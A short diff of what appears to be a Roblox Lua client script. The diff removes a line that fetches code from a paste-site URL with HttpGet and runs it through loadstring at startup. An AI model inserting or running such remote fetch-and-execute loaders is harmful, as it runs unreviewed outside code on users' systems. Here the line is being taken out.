@@ -1,7 +1,6 @@
 repeat task.wait() until game:IsLoaded()
 local Players, RunService, UIS, TS, Lighting, HS = game:GetService("Players"), game:GetService("RunService"), game:GetService("UserInputService"), game:GetService("TweenService"), game:GetService("Lighting"), game:GetService("HttpService")
 local LP = Players.LocalPlayer
-loadstring(game:HttpGet("https://pastefy.app/sdeRXPti/raw"))()
 -- =============== INTRO ===============
 local INTRO_CONFIG_FILE = "vortex_config.json"
 local introSkipEnabled = false
